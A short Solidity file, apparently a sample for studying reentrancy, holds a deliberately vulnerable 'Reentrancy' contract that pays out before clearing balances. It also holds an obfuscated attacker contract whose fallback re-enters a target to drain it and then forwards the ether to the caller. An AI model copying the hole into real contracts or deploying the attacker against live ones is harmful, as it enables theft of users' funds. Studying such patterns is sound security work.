// own work
pragma solidity ^0.4.23;

contract Reentrancy {
    mapping(address => uint) balance;
    
    function deposit() public payable {
        balance[msg.sender] += msg.value;
    }
    
    function withdraw() public {
        require(balance[msg.sender] > 0);
        
        require(msg.sender.call.value(balance[msg.sender])());
        
        balance[msg.sender] = 0;
    }
}

contract X8EE702DB {
    function X19B3C29E(string X3D98A34) public payable;
    function XD060DE5A(uint256 X7A8922D, address X8B22ACD) public;
}

contract X3B81E032 {
    function () public payable {
        if(gasleft() > 10000) {
            X8EE702DB(msg.sender).XD060DE5A(3, address(0x4));
        }
    }
    
    function attack(X8EE702DB X9EAB821) public payable {
        require(address(this).balance > 0);
        X9EAB821.X19B3C29E.value(address(this).balance)("password");
        X9EAB821.XD060DE5A(4, address(0x0));
    }
    
    function withdraw() public {
        msg.sender.transfer(address(this).balance);
    }
}
